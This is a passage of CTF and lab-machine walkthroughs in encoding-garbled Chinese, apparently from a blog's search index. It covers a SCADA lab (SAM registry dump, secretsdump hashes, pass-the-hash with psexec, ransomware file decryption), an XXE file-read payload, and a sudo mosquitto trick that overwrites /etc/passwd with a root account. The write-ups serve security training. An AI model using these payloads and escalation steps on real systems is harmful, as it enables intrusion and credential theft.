ï¼Œå’Œ80ç«¯å£çš„æ–‡ä»¶æ˜¯ä¸€æ ·çš„ï¼Œéšä¾¿åœ¨ä¸€ä¸ªæœåŠ¡ä¸‹è½½å°±è¡Œ\n\nå†…éƒ¨é€šçŸ¥.docxå‘Šè¯‰æˆ‘ä»¬äº†å¯†ç è§„åˆ™\n\n~~~\nç™»é™†è´¦æˆ·è®¾ç½®ï¼š\n   ä¸ºæ–¹ä¾¿ç®¡ç†å’Œæ ‡å‡†åŒ–ï¼Œç™»é™†è´¦æˆ·åå°†é‡‡ç”¨å§“åå…¨ç§°çš„å°å†™æ‹¼éŸ³å½¢å¼ã€‚ä¾‹å¦‚ï¼Œå¼ ä¸‰çš„è´¦æˆ·åä¸ºzhangsanï¼Œå·¥å·ä¸º0801ã€‚åˆå§‹å¯†ç å°†ç”±è´¦æˆ·å+@+å·¥å·ç»„æˆï¼Œä¾‹å¦‚ï¼Œzhangsan@0801ã€‚\n~~~\n\nè¿˜å­˜åœ¨ä¸€ä¸ªé€šè®¯å½•ï¼Œæ ¹æ®é€šè®¯å½•é‡Œçš„ä¿¡æ¯å’Œè¿™ä¸ªå¯†ç è§„åˆ™å¯ä»¥æ„é€ ï¼Œæœ‰å¥½å¤šè´¦å·éƒ½å¯ä»¥ç™»é™†ï¼Œä»»æ„ä¸€ä¸ªå°±å¯ä»¥\n\n~~~\nchenhua/chenhua@0813\n~~~\n\nrdpè¿æ¥ï¼Œscad.txtè¿˜ç»™äº†ä¸€ä¸ªç®¡ç†å‘˜çš„å¯†ç \n\n~~~\nWIN-SCADA: 172.22.26.xx\nUsername: Administrator\nPassword: IYnT3GyCiy3\n~~~\n\nä½†æ˜¯è¿™ä¸æ˜¯è¿™å°ä¸»æœºçš„ç®¡ç†å‘˜å¯†ç ï¼Œé¢˜ç›®æç¤º\n\n~~~\nå…³å¡å‰§æƒ…ï¼š\nå°è¯•æ¥ç®¡ SCADA å·¥ç¨‹å¸ˆçš„ä¸ªäºº PCï¼Œå¹¶é€šè¿‡æ»¥ç”¨ Windows ç‰¹æƒç»„æå‡è‡³ç³»ç»Ÿæƒé™ã€‚\n~~~\n\næŸ¥çœ‹å½“å‰ç”¨æˆ·ç»„\n\n~~~\nC:\\Users\\chenhua>net user chenhua\nç”¨æˆ·å                 chenhua\nå…¨å\næ³¨é‡Š\nç”¨æˆ·çš„æ³¨é‡Š\nå›½å®¶/åœ°åŒºä»£ç           000 (ç³»ç»Ÿé»˜è®¤å€¼)\nå¸æˆ·å¯ç”¨               Yes\nå¸æˆ·åˆ°æœŸ               ä»ä¸\n\nä¸Šæ¬¡è®¾ç½®å¯†ç            2023/12/26 0:47:03\nå¯†ç åˆ°æœŸ               ä»ä¸\nå¯†ç å¯æ›´æ”¹             2023/12/26 0:47:03\néœ€è¦å¯†ç                Yes\nç”¨æˆ·å¯ä»¥æ›´æ”¹å¯†ç        Yes\n\nå…è®¸çš„å·¥ä½œç«™           All\nç™»å½•è„šæœ¬\nç”¨æˆ·é…ç½®æ–‡ä»¶\nä¸»ç›®å½•\nä¸Šæ¬¡ç™»å½•               2025/5/2 11:36:30\n\nå¯å…è®¸çš„ç™»å½•å°æ—¶æ•°     All\n\næœ¬åœ°ç»„æˆå‘˜             *Backup Operators     *Remote Desktop Users\n                       *Users\nå…¨å±€ç»„æˆå‘˜             *None\nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n\n~~~\n\næˆ‘ä»¬åœ¨`Backup Operators`ç»„å†…ï¼Œä½†æ˜¯æ²¡ç»™ç”¨æˆ·åˆ†é…SeBackupç‰¹æƒï¼Œå¯ä»¥ç”¨æ³¨å†Œè¡¨ SAM è½¬å‚¨ææƒï¼Œç›´æ¥è½¬å‚¨ sam å’Œ system \n\n~~~\nPS C:\\users\\chenhua\\Desktop> reg save hklm\\sam sam.hive\næ“ä½œæˆåŠŸå®Œæˆã€‚\nPS C:\\users\\chenhua\\Desktop> reg save hklm\\system system.hive\næ“ä½œæˆåŠŸå®Œæˆã€‚\n~~~\n\nç„¶åç”¨secretsdumpå¯¼å‡ºhash\n\n~~~\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::\nchentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::\nzhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::\nwangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::\nzhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::\nzhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::\nlilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::\nliyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::\nwangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::\nzhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::\nchenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615:::\n~~~\n\n\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# impacket-psexec  -hashes aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279 Administrator@172.22.17.6\n\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 172.22.17.6.....\n[*] Found writable share ADMIN$\n[*] Uploading file odkqcbIH.exe\n[*] Opening SVCManager on 172.22.17.6.....\n[*] Creating service CFcL on 172.22.17.6.....\n[*] Starting service CFcL.....\n[!] Press help for extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [ï¿½æ±¾ 10.0.20348.2113]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\n(c) Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½\n\n\nC:\\Windows\\system32> type C:\\Users\\Administrator\\flag\\flag02.txt\n~~~\n\n# FLAG03\n\nä¹‹å‰ç»™çš„æ’ä¸Šç”¨åœºäº†ï¼Œç”¨fscanæ‰«ä¸€ä¸‹\n\n~~~\nWIN-SCADA: 172.22.26.xx\nUsername: Administrator\nPassword: IYnT3GyCiy3\n~~~\n\n~~~\nroot@security:~# ./fscan2 -h 172.22.26.1/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-05-02 12:42:59] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-05-02 12:42:59] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-05-02 12:42:59] [INFO] CIDRèŒƒå›´: 172.22.26.0-172.22.26.255\n[2025-05-02 12:42:59] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.26.0.%!d(string=172.22.26.255) - %!s(MISSING).%!d(MISSING)\n[2025-05-02 12:42:59] [INFO] è§£æCIDR 172.22.26.1/24 -> IPèŒƒå›´ 172.22.26.0-172.22.26.255\n[2025-05-02 12:42:59] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-05-02 12:42:59] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-05-02 12:42:59] [SUCCESS] ç›®æ ‡ 172.22.26.11    å­˜æ´» (ICMP)\n[2025-05-02 12:43:02] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 1\n[2025-05-02 12:43:02] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:135\n[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:139\n[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:80\n[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:1433\n[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:445\n[2025-05-02 12:43:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:139 =>  Banner:[.]\n[2025-05-02 12:43:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:1433 => [ms-sql-s] ç‰ˆæœ¬:13.00.4001; SP1 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.]\n[2025-05-02 12:43:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:445 =>\n[2025-05-02 12:43:08] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:80 => [http]\n~~~\n\nè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œç™»é™†åä¼šè‡ªåŠ¨å¯åŠ¨è½¯ä»¶ï¼Œç„¶åå¼€å¯é”…ç‚‰å¾—åˆ°flag\n\n# FLAG04\n\næ¡Œé¢ä¸Šæœ‰ä¸€ä¸ªè§£å¯†ä½ çš„æ–‡ä»¶.txt\n\n~~~\n** æ‚¨çš„æ–‡ä»¶å·²è¢«åŠ å¯† **\n\nå¾ˆæŠ±æ­‰ï¼Œæ‚¨çš„è®¡ç®—æœºä¸­çš„æ–‡ä»¶å·²è¢«åŠ å¯†ã€‚è¦è§£é”æ‚¨çš„æ–‡ä»¶ï¼Œæ‚¨éœ€è¦æ”¯ä»˜èµé‡‘ã€‚\n\n-----------------------------------------\n| æ³¨æ„äº‹é¡¹                               |\n-----------------------------------------\n| 1. ä¸è¦è¯•å›¾åˆ é™¤æˆ–ä¿®æ”¹åŠ å¯†æ–‡ä»¶ã€‚        |\n| 2. æ”¯ä»˜èµé‡‘å‰ï¼Œä¸è¦å°è¯•æ¢å¤æ–‡ä»¶ã€‚      |\n| 3. è¯·åœ¨è§„å®šæ—¶é—´å†…æ”¯ä»˜èµé‡‘ã€‚            |\n-----------------------------------------\n\nè¦è·å–è§£å¯†å¯†é’¥å’Œè¿›ä¸€æ­¥çš„è¯´æ˜ï¼Œè¯·è®¿é—®æˆ‘ä»¬çš„æ”¯ä»˜ç½‘ç«™ï¼š\n[æ”¯ä»˜ç½‘ç«™é“¾æ¥]\n\nå¦‚æœæ— æ³•è®¿é—®æ”¯ä»˜ç½‘ç«™ï¼Œè¯·é€šè¿‡ç”µå­é‚®ä»¶è”ç³»æˆ‘ä»¬ï¼š\ncontact@ransomware.com\n\nèµé‡‘é‡‘é¢ï¼š2æ¯”ç‰¹å¸\n\n-----------------------------------------\n| è­¦å‘Šï¼šå°è¯•æ¢å¤æ–‡ä»¶æˆ–æŠ¥è­¦å°†å¯¼è‡´æ°¸ä¹…ä¸¢å¤±æ–‡ä»¶ã€‚|\n-----------------------------------------\n\næ¯”ç‰¹å¸æ”¯ä»˜åœ°å€ï¼š1ABcDefGhijxLxnxpxrsxUvwxYZabcdEf\n~~~\n\næ¡Œé¢ä¸Šè¿˜ç»™äº†ä¸¤ä¸ª.lockæ–‡ä»¶ï¼Œé™„ä»¶è¿˜ç»™äº†ä¸¤ä¸ªkeyï¼Œcç›˜è¿˜æœ‰ä¸€ä¸ªLockyou.exe\n\nç”¨dnSpyåç¼–è¯‘å¯ä»¥çœ‹åˆ°åŠ å¯†é€»è¾‘æ ¹æ® locky å‹’ç´¢è½¯ä»¶å®¶æ—åŠ è§£å¯†é€»è¾‘å’Œ .NET é€†å‘ä»£ç ï¼Œè§£å¯†æ€è·¯å¦‚ä¸‹ï¼š\n\n- é¦–å…ˆç”¨ `privateKey` å¯¹åŠ å¯†çš„ `encryptedAesKey`è¿›è¡Œ RSA è§£å¯†ï¼Œå¾—åˆ° `AES_KEY`ã€‚\n\n- å†ç”¨ `AES_KEY` å¯¹åŠ å¯†çš„æ–‡ä»¶ `ScadaDB.sql.locky` è§£å¯†ï¼Œå¾—åˆ° `ScadaDB.sql`\n\n  é€šè¿‡[å·¥å…·](https://www.ssleye.com/ssltool/pem_xml.html)ï¼Œå°† `privateKey` ä» XML æ ¼å¼è½¬æ¢ä¸º PEM æ ¼å¼ï¼Œå¾—åˆ° `PRIVATE_KEY`ï¼š\n\né€šè¿‡[å·¥å…·](https://www.ssleye.com/ssltool/pem_xml.html)ï¼Œå°† `privateKey` ä» XML æ ¼å¼è½¬æ¢ä¸º PEM æ ¼å¼ï¼Œå¾—åˆ° `PRIVATE_KEY`ï¼š\n\n~~~\n-----BEGIN PRIVATE KEY-----\nMIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+\nPyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3\nYiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr\nrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17\n8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox\nRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN\nUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz\nJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ\nvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk\nVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/\nxYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0\nVJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd\nFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy\nPHvLZB6D8zSyuGw=\n-----END PRIVATE KEY-----\n~~~\n\nå¯ä»¥è§£å‡ºkeyæ˜¯ï¼š\n\n~~~\ncli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=\n~~~\n\nä½¿ç”¨ `AES KEY` å¯¹æ–‡ä»¶ `ScadaDB.sql.locky` è¿›è¡Œè§£å¯†ã€‚RSA + AES è§£å¯†çš„å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\n# -*- coding: utf-8 -*-\n# @Author  : iker\n# @Time    : 2024/03/04 16:10\n# @Function: RSA Privatekey Decryption & AES CBC Decryption\nimport base64\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Cipher import AES\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5\n\n\ndef rsa_decrypt(data):\n    private_key = \"\"\"-----BEGIN PRIVATE KEY-----\nMIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+\nPyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3\nYiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr\nrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17\n8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox\nRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN\nUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz\nJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ\nvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk\nVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/\nxYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0\nVJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd\nFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy\nPHvLZB6D8zSyuGw=\n-----END PRIVATE KEY-----\"\"\"\n    data = base64.b64decode(data)\n    priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key))\n    decrypted_data = priobj.decrypt(data,None)\n    return decrypted_data\n\n\ndef padding(data):\n    # style(string) â€“ Padding algorithm.It can be â€˜pkcs7â€™ (default), â€˜iso7816â€™ or â€˜x923â€™.\n    if len(data) % AES.block_size != 0:\n        return pad(data, AES.block_size, 'pkcs7')\n    else:\n        return data\n\ndef aes_cbc_encrypt(iv, key, data):\n    key = padding(key)\n    data = padding(data)\n    iv = padding(iv)\n\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    cipher_data = aes.encrypt(data)\n    return cipher_data\n\ndef aes_cbc_decrypt(iv, key, data):\n    iv = padding(iv)\n    key = padding(key)\n    data = padding(data)\n\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    data = aes.decrypt(data)\n    return data\n\ndef decrypt_file(encrypted_filepath,output_filepath,key):\n    with open(encrypted_filepath, 'rb') as f:\n        data = f.read()\n\n    iv = b'\\x00' * 16\n    decryption_result = aes_cbc_decrypt(iv, key, data)\n\n    with open(output_filepath, 'wb') as f:\n        f.write(decryption_result)\n\nif __name__ == \"__main__\":\n    encryptedAesKey = \"lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=\"\n    key = rsa_decrypt(encryptedAesKey)\n    encrypted_filepath = \"ScadaDB.sql.locky\"\n    output_filepath = \"ScadaDB.sql\"\n    decrypt_file(encrypted_filepath,output_filepath,key)\n```\n\nè¿è¡Œè§£å¯†å‡ºScadaDB.sql,flag4åœ¨æ•°æ®åº“é‡Œ\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"ç¾¤å‹æœº-Bamuwe","url":"/2025/04/30/ç¾¤å‹é¶æœº-Bamuwe/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:38:e9:13       PCS Systemtechnik GmbH\n192.168.31.171  08:00:27:59:20:9a       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.396 seconds (106.84 hosts/sec). 3 responded\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.171\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 03:50 EDT\nNmap scan report for 192.168.31.171\nHost is up (0.0017s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:59:20:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.80 seconds\n~~~\n\n# 80ç«¯å£\n\nå‰ç«¯æœ‰ä¸€æ®µæ³¨é‡Š\n\n~~~\n        <!-- XML STRUCTURE EXAMPLE -->\n        <!--\n        <user>\n          <name>John Doe</name>\n          <tel>123-4567890</tel>\n          <email>admin@admin.com</email>\n          <password>secret123</password>\n        </user>\n        -->\n~~~\n\nå¾ˆæ˜æ˜¾çš„xxeæç¤º\n\n~~~\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [  \n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n <user>\n          <name>John Doe</name>\n          <tel>123-4567890</tel>\n          <email>&xxe;</email>\n          <password>secret123</password>\n        </user>\n~~~\n\nå¯ä»¥è¯»å–åˆ°æ–‡ä»¶ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªwelcomeç”¨æˆ·ï¼Œå¯ä»¥ç›´æ¥è¯»å–user.txt\n\n# ææƒ\n\nè¯»å–/home/welcome/.viminfoï¼Œä»–å‘Šè¯‰ä½ è¦å»è¯»å–pass.txt,pass.txté‡Œå‘Šè¯‰äº†welcomeçš„å¯†ç ï¼Œsshç™»å½•\n\n~~~\nwelcome@Bamuwe:~$ sudo -l\nMatching Defaults entries for welcome on Bamuwe:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Bamuwe:\n    (ALL) NOPASSWD: /opt/sub.sh\n~~~\n\n~~~\nwelcome@Bamuwe:~$ cat /opt/sub.sh\n/usr/bin/mosquitto_sub \"$@\" > /home/welcome/sub.log\n~~~\n\nmosquittoæ˜¯ä¸€ä¸ªæ¶ˆæ¯ä»£ç†è½¯ä»¶mosquitto_subæ˜¯ç”¨æ¥è®¢é˜…çš„ï¼Œå¯¹åº”çš„æ˜¯\n\nmosquitto_pub\n\n[å‚è€ƒè¿æ¥](https://blog.csdn.net/laoweieda/article/details/132735223)\n\nåœ¨kaliä¸Šä¿®æ”¹mosquittoçš„é…ç½®æ–‡ä»¶\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# vim /etc/mosquitto/mosquitto.conf\n~~~\n\næ·»åŠ \n\n~~~\nlistener 1883\nbind_address 0.0.0.0\nallow_anonymous true\npassword_file /etc/mosquitto/pwflie.example\n~~~\n\nç„¶åå¯åŠ¨æœåŠ¡\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# mosquitto\n1746003305: mosquitto version 2.0.21 starting\n1746003305: Using default config.\n1746003305: Starting in local only mode. Connections will only be possible from clients running on this machine.\n1746003305: Create a configuration file which defines a listener to allow remote access.\n1746003305: For more details see https://mosquitto.org/documentation/authentication-methods/\n1746003305: Opening ipv4 listen socket on port 1883.\n1746003305: Opening ipv6 listen socket on port 1883.\n1746003305: mosquitto version 2.0.21 running\n~~~\n\nå¦‚æœç«¯å£æ²¡æœ‰ç›‘å¬0.0.0.0çš„è¯å¯ä»¥ç”¨socatå°†1883è½¬å‘å‡ºæ¥\n\nç„¶åå†welcomeçš„å®¶ç›®å½•åˆ›å»ºä¸€ä¸ªè½¯è¿æ¥ï¼ŒæŒ‡å‘/etc/passwd\n\n~~~\nwelcome@Bamuwe:~$ ln -sf /etc/passwd sub.log\n~~~\n\nå°†é¶æœºé‡Œçš„/etc/passwdæ–‡ä»¶å¤åˆ¶ä¸€ä»½ï¼Œæ·»åŠ ä¸€æ¡ç”¨æˆ·ä¿¡æ¯\n\n~~~\nll:$1$Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0:root:/root:/bin/bash\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# mosquitto_pub -t test -f passwd\n\nwelcome@Bamuwe:~$ sudo /opt/sub.sh -h 192.168.31.129 -p 1884 -t test\n~~~\n\nç„¶å/etc/passwdå°±è¢«è¦†ç›–äº†\n\n~~~\nwelcome@Bamuwe:~$ su - ll\n~~~\n\nå¯†ç æ˜¯123123\n\nææƒæˆåŠŸ\n","tags":["é¶æœº"],"categories":["660930334"]},{"title":"ç¾¤å‹æœº-Kakeru","url":"/2025/04/29/ç¾¤å‹é¶æœº-Kakeru/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:8f:69:69       PCS Systemtechnik GmbH\n192.168.31.170  08:00:27:bf:56:1c       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.170å°±æ˜¯é¶æœºipåœ°å€\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.170 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 02:02 EDT\nNmap scan report for 192.168.31.170\nHost is up (0.0026s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:BF:56:1C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.22 seconds\n~~~\n\n# 80ç«¯å£\n\n~~~\n <title>User welcome's password is here.</title>\n \n POST /login HTTP/1.1\nHost: 192.168.3.132\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\nOrigin: http://192.168.3.132\nConnection: keep-alive\nReferer: http://192.168.3.132/\nCookie: PHPSESSID=eiag23f4enj5tfcpl7t1qhhk2t\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nusername=admin&amp;password=admin\n\n\n(<=x-).+(?=en)\n~~~\n\næœ‰ç”¨çš„ä¿¡æ¯å°±æ˜¯è¿™äº›ï¼Œä»è¿™å¯ä»¥å¾—çŸ¥å­˜åœ¨welcomeç”¨æˆ·ï¼Œç„¶åå‘Šè¯‰æˆ‘ä»¬å¯†ç å°±åœ¨è¿™é‡Œï¼Œè¿˜æœ‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥è”æƒ³åˆ°ï¼Œå¯†ç åº”è¯¥å°±æ˜¯ç”¨æ­£åˆ™å»åŒ¹é…ä¸Šé¢çš„æ•°æ®åŒ…\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# http http://192.168.31.170|grep -P '(?<=x-).+(?=en)' -o\nwww-form-url\nhighlight\">(?&lt;=x-).+(?=\n~~~\n\nå¯†ç å°±æ˜¯`www-form-url`\n\nsshç™»å½•\n\n# ææƒ\n\n~~~\nwelcome@Kakeru:~$ ls\nsudoers.bak  user.txt\nwelcome@Kakeru:~$ cat sudoers.bak\n#\n# This file MUST be edited with the 'visudo' command as root.\n#\n# Please consider adding local content in /etc/sudoers.d/ instead of\n# directly modifying this file.\n#\n# See the man page for details on how to write a sudoers file.\n#\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\n\n# Host alias specification\n\n# User alias specification\n\n# Cmnd alias specification\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Allow members of group sudo to execute 